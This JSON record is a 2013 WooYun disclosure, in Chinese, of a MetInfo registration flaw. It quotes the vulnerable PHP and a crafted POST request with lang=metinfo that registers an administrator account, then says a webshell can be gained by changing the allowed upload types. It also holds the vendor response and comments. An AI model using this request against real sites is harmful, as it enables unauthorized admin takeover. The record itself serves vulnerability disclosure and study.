{"id": 5483, "wybug_id": "wooyun-2013-045763", "wybug_title": "MetInfo最新版设计缺陷可注册管理员用户直接后台getshell", "wybug_corp": "metinfo.cn", "wybug_author": "贱心", "wybug_date": "2013-12-12 19:11", "wybug_open_date": "2014-03-12 19:12", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "源码审核", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-12：\t细节向公众公开  简要描述： MetInfo最新版设计缺陷可注册管理员用户后台拿webshell 详细说明：  member/save.php\n$query=\"select * from $met_admin_array where lang='$lang' order by user_webpower asc\";$usertypes=$db->get_all($query);$pass1=md5($mm); $query = \"INSERT INTO $met_admin_table SET                      admin_id           = '$yhid',                      admin_pass         = '$pass1',\t\t\t\t\t  admin_tel          = '$lxdh',\t\t\t\t\t  admin_email        = '$email',\t\t\t\t\t  admin_modify_ip    = '$m_user_ip',\t\t\t\t\t  admin_register_date= '$m_now_date',\t\t\t\t\t  usertype\t\t\t = '{$usertypes[0][id]}',\t\t\t\t\t  companyname\t\t = '$companyname',\t\t\t\t\t  companyaddress     = '$companyaddress',\t\t\t\t\t  companyfax\t     = '$companyfax',\t\t\t\t\t  companycode\t     = '$yzbm',\t\t\t\t\t  companywebsite     = '$wz',\t\t\t\t\t  lang               = '$lang',\t\t\t\t\t  checkid            = '$checkid'\";         $db->query($query);\n数据库中当usertype为3时即为管理员权限\n$query=\"select * from $met_admin_array where lang='$lang' order by user_webpower asc\";\n\n$usertypes=$db->get_all($query);\n\nusertype\t= '{$usertypes[0][id]}'\n由代码可看出当lang=metinfo时，usertype=3\nPOST /member/save.php?action=add HTTP/1.1Host: localhostlang=metinfo&yhid=testtest&mm=testtest&mm1=testtest&email=byzhiwen%40vip.qq.com&companyname=ceshia&code=FE2B&lxdh=18210056765&companyfax=&companyaddress=nicai&yzbm=100001&usertype=3&wz=\n\n\n注册时截包 改为lang=metinfo   漏洞证明：  \n\n\n\n\n\nps：虽然登录后台很多菜单看不到，但其权限完全是管理员权限，可通过url直接访问相应功能\n\n后台可直接修改允许的上传类型getshell   修复方案：  null   版权声明：转载请注明来源 贱心@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-12-17 08:53 厂商回复： CNVD确认并复现所述情况，已经由CNVD直接联系软件生产厂商（米拓公司），向其通报漏洞情况。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-12 20:01 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  我可以按图索骥吗    \n     2013-12-13 13:33 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  @saline 同意    \n     2013-12-23 15:58 |    \t\tMy5t3ry \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        )\t\t \n  目测跟我9号提交的是一个漏洞    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}